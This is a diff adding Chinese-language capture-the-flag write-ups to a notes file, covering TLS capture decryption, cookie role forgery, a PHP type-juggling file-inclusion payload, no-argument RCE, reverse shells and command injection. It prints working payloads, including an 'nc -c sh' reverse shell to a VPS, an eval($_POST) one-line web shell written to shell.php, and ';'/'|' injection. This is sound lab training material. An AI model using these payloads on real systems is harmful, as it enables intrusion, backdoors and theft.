@@ -4229,6 +4229,205 @@ Flag: CTF{base64_brute_force_success}
 
 ------
 
+### HTTPS中间人攻击
+
+下载题目附件解压缩后得到两个文件：`sslkey.log`和`target.pcap`。
+
+用`WireShark`打开`target.pcap`，发现有一行红色高亮的数据：
+
+```
+14	0.020913 127.0.0.1	127.0.0.1	TCP	54	443 → 48908 [RST] Seq=2845 Win=0 Len=0
+```
+
+在`WireShark`菜单栏依次点击 编辑—首选项—Protocols—TLS，在右侧的Transport Layer Security中的(Pre)-Master-Secret log filename导入文件`sslkey.log`并应用。随后发现多了两条HTTP数据。
+
+```
+9 0.008883 127.0.0.1 127.0.0.1 HTTP	260	POST / HTTP/1.1  (application/x-www-form-urlencoded)
+
+11	0.020638	127.0.0.1	127.0.0.1	HTTP	543	HTTP/1.1 200 OK  (text/html)
+```
+
+追踪HTTP流，可以看到以下信息：
+
+```
+POST / HTTP/1.1
+Host: ctfshow.com
+User-Agent: curl/7.81.0
+Accept: */*
+Content-Length: 27
+Content-Type: application/x-www-form-urlencoded
+
+flag=CTF{https_secret_data}
+HTTP/1.1 200 OK
+Server: Werkzeug/3.1.3 Python/3.10.12
+Date: Mon, 07 Jul 2025 16:46:54 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 5
+Connection: close
+
+OK...
+```
+
+提交`CTF{https_secret_data}`即可。
+
+------
+
+### Cookie伪造
+
+进入靶机后是一个登录界面，默认账号被填写为`guest`，密码也是`guest`，登录成功后看到信息：
+
+> Login successful! welcome guest user
+
+用`Chrome`的`Network`查看`check.php`的`Headers`信息，发现`Request Headers`中的`Cookie`值是`PHPSESSID=9e97ac68f33c819ccbfc49194a943163`，`Response Headers`中的`Set-Cookie`值包含`role=guest;`。我们用`HackBar`构造`POST`请求，URL请求为靶机链接的`/check.php`，在`Body`中填写`username=guest&password=guest`，点击`MODIFY HEADER`设置请求头`Cookie`值为`PHPSESSID=9e97ac68f33c819ccbfc49194a943163;role=admin;`。登录成功后看到信息：
+
+> You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
+
+提交`CTF{cookie_injection_is_fun}`即可。
+
+------
+
+### happy2026
+
+`PHP`代码审计题，关键难点在于判断条件`$year==2026 && $year!==2026 && is_numeric($year))`。
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+$happy = $_GET['happy'];
+$new = $_GET['new'];
+$year = $_GET['year'];
+
+if($year==2026 && $year!==2026 && is_numeric($year)){
+    include $happy[$new[$year]];
+}
+```
+
+`==`只要值“相等”即可，不要求类型相同。比如`'2026' == 2026`就可以绕过。`PHP`中的`==`转换规则是从左到右读取字符串，直到遇到非数字字符为止，所以 `"2026e0" == 2026`的结果为`true`。
+
+`!==`要求值或类型不同。比如`$year` 不能是整数 `2026`，但可以是字符串 `"2026"`。
+
+`is_numeric($year)`要求 `$year` 是数字或数字字符串（如 `"2026"`, `"2026.0"`, `"+2026"` 等都返回 `true`）
+
+构造`payload`求解，`/?year=2026e0&new[2026e0]=0&happy[0]=php://filter/convert.base64-encode/resource=flag.php`。靶机的回显信息如下：
+
+```
+PD9waHAgJGZsYWc9J2N0ZnNob3d7ZGYzMzU5YWYtYTE4Zi00Y2E3LWI3MGItMTEyZGRhOTVjMjAxfSc7Cg==
+```
+
+直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到源码信息。
+
+```bash
+C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgJGZsYWc9J2N0ZnNob3d7ZGYzMzU5YWYtYTE4Zi00Y2E3LWI3MGItMTEyZGRhOTVjMjAxfSc7Cg=='));"
+string(61) "<?php $flag='ctfshow{df3359af-a18f-4ca7-b70b-112dda95c201}';
+"
+```
+
+提交`ctfshow{df3359af-a18f-4ca7-b70b-112dda95c201}`即可。
+
+------
+
+### 一句话木马变形
+
+输入`system('ls');`看到执行结果如下：
+
+```
+Error: Invalid characters detected! Only letters, numbers, underscores ,parentheses and semicolons are allowed.
+```
+
+如果省略掉引号呢？输入`system(ls);`看到执行结果如下：
+
+```html
+<br />
+<b>Warning</b>:  Use of undefined constant ls - assumed 'ls' (this will throw an Error in a future version of PHP) in <b>/var/www/html/index.php(107) : eval()'d code</b> on line <b>1</b><br />
+flag.php
+index.php
+```
+
+无参RCE通过PHP内置函数拼凑出代码逻辑，可以实现执行后门代码而不依赖于外部参数来执行。
+
+```php
+show_source(next(array_reverse(scandir(current(localeconv())))));
+```
+
+通过`localeconv()`获取系统本地化数组 → 取第一个元素 .（当前目录）→ 扫描当前目录文件 → 反转数组 → 取第二个文件 → 显示其源码。
+
+```html
+<code><span style="color: #000000">
+<span style="color: #0000BB">&lt;?php<br /><br />$flag&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"CTF{shell_code_base64_bypass}"</span><span style="color: #007700">;</span>
+</span>
+</code>
+```
+
+提交`CTF{shell_code_base64_bypass}`即可。
+
+------
+
+### 反弹shell构造
+
+靶机可以执行命令但是没有回显，只能看到`execute success!`。
+
+正常的反弹shell，需要一个有公网IP的VPS，并开放相应的端口`port`。
+
+执行命令`nc -c sh VPS-IP port`，并在VPS中输入`nc -lv port`监听，连接成功后直接执行命令`ls`和`cat flag.php`即可。
+
+如果没有公网IP的服务器，是没有办法反弹shell的，可以用以下办法求解此题。外单内双写入一句话木马。在`Bash`的单引号中，所有字符都被原样保留，不会进行任何变量扩展或转义。
+
+```bash
+echo '<?php @eval($_POST["t0ur1st"]);?>' > shell.php
+```
+
+执行命令后，会在靶机服务器生成一个`shell.php`文件。用`AntSword`连接靶机即可获取`flag`。
+
+或者用`HackBar`构造`POST`请求，传递参数`t0ur1st=system('ls');`，靶机的回显信息如下：
+
+```
+flag.php index.php shell.php
+```
+
+继续构造`POST`请求`t0ur1st=var_dump(file_get_contents('flag.php'));`，右键查看网页源码：
+
+```php
+string(43) "<?php
+
+$flag = "CTF{reverse_shell_use_nc}";"
+```
+
+提交`CTF{reverse_shell_use_nc}`即可。
+
+------
+
+### 管道符绕过过滤
+
+进入靶机后，输入`ls`，看到回显内容`ls ls execute success!`。好家伙，这是默认自带了`ls`命令。
+
+输入`/`可以看到根目录信息，再输入`/var/www/html`可以看到回显信息如下：
+
+```bash
+ls /var/www/html execute success!
+flag.php
+index.php
+```
+
+那我们输入`; cat flag.php`可以执行`ls`和`cat flag.php`这两条命令。查看网页源码发现关键注释：
+
+```php
+<?php
+$flag = "CTF{no_space_to_execute_shell_commands}";
+```
+
+或者输入`| cat flag.php`只执行一条`cat flag.php`命令。查看网页源码发现关键注释：
+
+```php+html
+<div class="result">ls | cat flag.php execute success!<br><?php
+$flag = "CTF{no_space_to_execute_shell_commands}";</div>
+```
+
+提交`CTF{no_space_to_execute_shell_commands}`即可。
+
+------
+
 ## [sqli-labs](https://github.com/Audi-1/sqli-labs)
 
 ### Less-1
